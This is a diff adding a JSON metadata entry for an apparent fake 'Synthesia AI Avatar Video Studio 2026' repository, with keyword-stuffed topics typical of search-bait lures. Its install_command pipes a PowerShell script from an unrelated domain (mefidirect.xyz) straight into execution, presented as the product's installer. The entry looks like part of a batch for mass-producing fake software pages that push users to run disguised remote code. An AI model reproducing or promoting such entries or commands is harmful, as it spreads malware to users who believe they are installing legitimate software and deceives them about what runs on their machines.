@@ -1,0 +1,29 @@
+{
+  "repo": "synthesia-ai-avatar-video-studio-2026",
+  "product": "Synthesia AI Avatar Video Studio 2026",
+  "kind": "video",
+  "install_type": "download",
+  "download_url": "https://synthesia.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "video",
+  "topics": [
+    "synthesia-complete",
+    "synthesia-tool",
+    "synthesia-video-recorder",
+    "windows-synthesia",
+    "synthesia-launch-fix",
+    "synthesia-windows-install",
+    "synthesia-live-streaming",
+    "synthesia-client-download",
+    "synthesia-deployment-guide",
+    "synthesia-deploy-2026",
+    "synthesia-offline-installer",
+    "streaming-tools",
+    "pc-utility",
+    "media-tools",
+    "windows-tools"
+  ]
+}
